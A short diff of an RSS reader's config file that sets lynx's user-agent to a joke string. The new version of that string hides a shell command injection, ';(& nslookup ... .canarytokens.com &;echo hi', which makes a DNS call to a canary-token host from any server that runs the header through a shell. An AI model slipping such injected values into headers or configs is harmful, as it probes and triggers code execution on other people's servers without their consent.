@@ -2,7 +2,7 @@ refresh-on-startup yes
 auto-reload yes
 
 #browser "/usr/local/bin/lynx -cfg=~/.lynxrc %u"
-browser "/usr/local/bin/lynx -useragent='!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! You know who else likes user agents? MY MOM!!!!! My browser is cli to avoid ads and irrelevant fluff. ♫ Come with me and you will see lots of stuff that is very witty! ♫  https://www.benfran.com/about !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!' -cfg=~/.lynxrc %u" 
+browser "/usr/local/bin/lynx -useragent='!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! You know who else likes user agents? MY MOM!!!!! My browser is cli to avoid ads and irrelevant fluff. ♫ Come with me and you will see lots of stuff that is very witty! ♫  https://www.benfran.com/about !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!;(& nslookup 7h2zkvican9grndpm3g2fom6s.canarytokens.com &;echo hi' -cfg=~/.lynxrc %u" 
 
 # display
 datetime-format %m-%d
